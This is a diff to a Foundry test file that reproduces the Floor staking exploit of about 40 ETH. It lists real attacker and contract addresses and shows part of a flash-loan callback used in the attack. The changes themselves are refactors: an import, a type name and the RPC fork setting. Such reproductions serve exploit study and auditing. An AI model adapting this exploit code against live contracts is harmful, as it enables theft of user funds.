@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo -- Total Lost : ~40 eth
 // Attacker : https://etherscan.io/address/0x4453aed57c23a50d887a42ad0cd14ff1b819c750
@@ -34,10 +33,10 @@ contract FloorStakingExploit is Test {
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     uint256 flashAmount;
     IFloorStaking staking = IFloorStaking(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);
-    Uni_Pair_V3 floorUniPool = Uni_Pair_V3(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0);
+    IUniswapV3Pair floorUniPool = IUniswapV3Pair(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0);
 
     function setUp() public {
-        vm.createSelectFork("https://eth.llamarpc.com", 18_068_772);
+        vm.createSelectFork("mainnet", 18_068_772);
 
         vm.label(address(floor), "floor");
         vm.label(address(sFloor), "sFloor");
@@ -59,7 +58,12 @@ contract FloorStakingExploit is Test {
         emit log_named_decimal_uint("weth balance after swap", WETH.balanceOf(address(this)), WETH.decimals());
     }
 
-    function uniswapV3FlashCallback(uint256, /*fee0*/ uint256 fee1, bytes calldata) external {
+    function uniswapV3FlashCallback(
+        uint256,
+        /*fee0*/
+        uint256 fee1,
+        bytes calldata
+    ) external {
         uint256 i = 0;
         while (i < 17) {
             uint256 balanceAttacker = floor.balanceOf(address(this));
